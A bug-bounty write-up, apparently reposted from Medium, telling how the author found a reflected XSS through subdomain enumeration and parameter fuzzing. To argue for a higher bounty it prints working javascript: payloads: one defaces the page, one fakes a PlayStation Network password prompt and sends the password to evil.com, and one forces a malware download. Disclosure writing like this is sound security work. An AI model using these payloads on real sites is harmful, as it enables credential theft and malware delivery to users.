---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-26_alternative-link.md
original_filename: 2023-02-26_alternative-link.md
title: Alternative link
category: documents
detected_topics:
- xss
- idor
- command-injection
- rate-limit
- mobile-security
tags:
- imported
- documents
- xss
- idor
- command-injection
- rate-limit
- mobile-security
language: en
raw_sha256: 74469b0be7e06ebb8ea95556e30b049a0f3c0f0143132b843af765d359eb5b6c
text_sha256: 2d825eb0789816f018ca5b91114835c665aedb155773f1d2df30133eafe1ad0f
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: true
---

# Alternative link

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-26_alternative-link.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, rate-limit, mobile-security
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: True
- Raw SHA256: `74469b0be7e06ebb8ea95556e30b049a0f3c0f0143132b843af765d359eb5b6c`
- Text SHA256: `2d825eb0789816f018ca5b91114835c665aedb155773f1d2df30133eafe1ad0f`


## Content

---
title: "Alternative link"
page_title: "RXSS — Story of $2000. Hi fellow hunters, in this write-up, I… | by p4n7h3rx | Medium"
url: "https://p4n7h3rx.medium.com/how-i-got-a-2000-bounty-with-rxss-e6f45f987793"
authors: ["Hashir Sami Khan (@P4n7h3Rx)"]
bugs: ["Reflected XSS"]
bounty: "2,000"
publication_date: "2023-02-26"
added_date: "2023-02-28"
source: "pentester.land/writeups.json"
original_index: 1470
scraped_via: "browseros"
---

# Alternative link

Top highlight

RXSS — Story of $2000
p4n7h3rx
Follow
4 min read
·
Feb 10, 2023

524

4

Hi fellow hunters, in this write-up, I will explain how I found a reflected cross-site scripting bug and showed multiple attack scenarios.

The target I was testing was an old public program, I will refer to it as www.redacted.com throughout this blog so let’s get started.

Finding Reflected XSS

I found a unique subdomain by performing Vertical and Horizontal subdomain enumeration. Have created my own bash script for subdomain enumeration which is based on the above methodology.

Check out this blog for subdomain enumeration.

https://sidxparab.gitbook.io/subdomain-enumeration-guide/types/horizontal-enumeration

The unique subdomain was accounts.example-website-test02.redacted.com’ when I tried to visit this subdomain it was redirecting me to the main domain www.redacted.com/login so I decided to fuzz the directories with ffuf

After Fuzzing got an endpoint named launcher on which there was a JS file with numerous hidden endpoints.

In JS file I found an Endpoint named LinkPsn on which I did recursive fuzzing and got one more endpoint named conflict, there was a page containing a continue button where I performed parameter fuzzing and find out the successRedirect Parameter which was vulnerable after clicking on continue button alert pops up.

Press enter or click to view image in full size

I immediately report this and my report was triaged but here is a twist!

staff member change the severity to low and give a $500 bounty I was shocked because on Low bug they were offering $500 & on Medium they were offering $2000.

Staff Members Response

This is a reflected XSS, this means that the only way to achieve something out of it is through phishing or something of the sorts. For this reason we decided to decrease the severity of this issue.

The Reflected XSS comes under the Severity Medium (4 ~ 6.9)

So I decided to show the impact by creating multiple use cases with the help of my friend Saad Ahmed

There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet, or another message. The attack could be targeted directly against a known user or could be an indiscriminate attack against any users of the application

Below are the different cases in which I have tried my best to show the impact of this Reflected XSS. There is much more we can do using the reflected like controlling the victim browser by sending him the beef hooked url using the reflected XSS

Case 1 : DEFACE

Get p4n7h3rx’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Payload:

javascript:document.getElementsByTagName(%60body%60)%5B0%5D.innerHTML=%60%3Ch1%3Ehacked%3C/h1%3E%60//
Press enter or click to view image in full size
Deface

Case 2 : Stealing Victim Password Sending to the attacker server

Payload :

javascript:document.getElementsByTagName(`body`)[0].innerHTML%20=%20`%3Cb%3ELink%20PlayStation%20Network%20Account%3C/b%3E%3C/br%3E%3C/br%3EVerify%20Your%20Password=***REDACTED***
Press enter or click to view image in full size
Stealing Password
Press enter or click to view image in full size
Sending Password To Attackers Server
javascript:document.getElementsByTagName(`body`)[0].innerHTML = `<b>Link PlayStation Network Account</b></br></br>Verify Your Password=***REDACTED*** type="password" id="pwd"><input type="submit" value="Link Account" onclick=window.location.href="//evil.com?pwd=***REDACTED***pwd").value>`//

Case 3 : Download Malware On Victim Computer

Payload :

javascript:window.location.href="https://thefiletree.com/app/conf/malware.exe"
Press enter or click to view image in full size
Malware on Victims System

Case 4 : Controlled DOM

Payload :

javascript:var all = document.getElementsByTagName("*");for (var i=0, max=all.length; i < max; i++) {alert(all[i])}//
Press enter or click to view image in full size
Control on DOM
Press enter or click to view image in full size
Before Exploitation
After Exploitation

Final Note

Thank you very much for your attention and I wish you good luck in finding as many bugs as possible and getting big rewards!

LinkedIn

Twitter
